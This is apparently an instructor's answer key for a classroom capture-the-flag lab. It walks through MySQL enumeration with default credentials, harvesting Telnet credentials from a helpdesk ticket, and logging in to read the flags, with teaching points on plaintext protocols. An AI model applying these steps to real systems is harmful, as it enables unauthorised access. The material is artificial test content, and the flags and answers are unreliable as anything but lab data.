# Week 7 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w7_sql_enumeration_success}`)

**Step 1 — Connect to MySQL:**
```bash
mysql -h 10.10.7.9 -u user -puserpassword --skip-ssl exampledb
```

**Step 2 — Enumerate tables:**
```sql
SHOW TABLES;
-- Shows: (normal tables) + ctf_flags
```

**Step 3 — Extract the flag:**
```sql
SELECT * FROM ctf_flags;
```

---

## Flag 2 — root.txt (`flag{w7_telnet_protocol_breach}`)

**Step 1 — Scan for Telnet:**
```bash
nmap -sV -p 23 10.10.7.10
```

**Step 2 — Find the credentials in MySQL:**
This is the intended twist: the credentials aren't guessable or sniffable —
they're sitting in a table students already have access to from Flag 1, but
easy to skim past since it isn't obviously a "credentials" table.
```sql
USE exampledb;
SHOW TABLES;
-- Shows: ctf_flags, helpdesk_tickets (+ any other seeded tables)
SELECT * FROM helpdesk_tickets;
```
`TICKET-4471` is an open ticket about a legacy telnet diagnostics account
that was never decommissioned, with the credentials embedded in the note
text rather than in their own column:
- Username: `svc_diag`
- Password: `Qa9vLp2x`

**Step 3 — Connect via Telnet:**
```bash
telnet 10.10.7.10
# Login: svc_diag / Qa9vLp2x
```

**Step 4 — Read the flag:**
```bash
cat /home/svc_diag/root.txt
```

Note: the Telnet server also has a `student` / `capture123` account — that's
the one used in Worksheet Exercise 4 for the plaintext-capture demo, and it
has no flag. Keep the two accounts separate: `student` is for the
Wireshark demo, `svc_diag` is the CTF account and is never given out
directly.

---

## Teaching Points

- Database enumeration (`SHOW TABLES`, `SELECT *`) should always cover all tables, not just expected ones
- Telnet transmits credentials in plaintext — Worksheet Exercise 4 has students confirm this
  themselves by capturing the `student` account's own login in Wireshark
- Flag 2 is a different lesson: credentials leak sideways between services all the time —
  here, via a "harmless" helpdesk note left in a database the student was already reading.
  Real incident response constantly finds creds in tickets, wikis, commit history, and chat logs
- Legacy protocols (Telnet, FTP, HTTP) are high-value targets because they lack encryption
- MySQL credentials `user:userpassword` are weak defaults matching the `MYSQL_USER`/`MYSQL_PASSWORD` env vars in docker compose
